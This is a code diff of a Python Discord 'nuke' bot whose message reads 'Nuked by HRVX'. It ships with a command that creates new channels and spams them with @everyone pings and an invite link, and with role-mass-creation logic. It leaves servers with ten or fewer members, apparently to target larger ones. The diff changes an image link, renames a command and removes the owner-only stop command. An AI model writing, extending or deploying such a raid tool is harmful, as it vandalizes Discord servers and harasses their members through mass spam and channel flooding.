@@ -16,7 +16,7 @@ bot = commands.Bot(command_prefix="!", intents=intents)
     "@everyone @here\n"
     "# Nuked by HRVX\n"
     "# [参加](https://discord.gg/QH4t5rSvXP)\n"
-    "# [画像](https://imgur.com/O3QjkOz)\n"
+    "# [画像](https://imgur.com/a/nW5Oxdm)\n"
     "# [画像](https://imgur.com/NbBGFcf)"
 )
 from discord import Status,Activity, ActivityType
@@ -30,7 +30,7 @@ async def on_ready():
     print(f"ログイン成功: {bot.user}")
     for guild in bot.guilds:
         human_count = sum(1 for member in guild.members if not member.bot)
-        print(f"確認中: {guild.name}（人間メンバー数: {human_count}）")
+        print(f"確認中: {guild.name}（メンバー数: {human_count}）")
 
         if human_count <= 10:
             print(f"{guild.name} から退出します（メンバーが10人以下）")
@@ -67,7 +67,7 @@ async def admin(ctx):
 
 @bot.command(name="roll")
 @commands.has_permissions(manage_roles=True)
-async def roll(ctx):
+async def role(ctx):
     total_existing_roles = len(ctx.guild.roles)
     if total_existing_roles >= 250:
         print(f"[LOG] ロール上限に達しているため作成中止 (サーバー: {ctx.guild.name})")
@@ -121,17 +121,5 @@ async def hrvx(ctx):
 
     await asyncio.gather(*(spam(ch) for ch in new_channels))
     print(" nukeログ")
-    
-@bot.command()
-@commands.is_owner()
-async def stop(ctx):
-    await ctx.send("Botを停止します。")
-    await bot.close()
-
-# エラーハンドリング（権限がないときのメッセージ例）
-@stop.error
-async def stop_error(ctx, error):
-    if isinstance(error, commands.NotOwner):
-        await ctx.send("このコマンドを実行できるのはボットの所有者だけです。")
         
 bot.run(TOKEN)
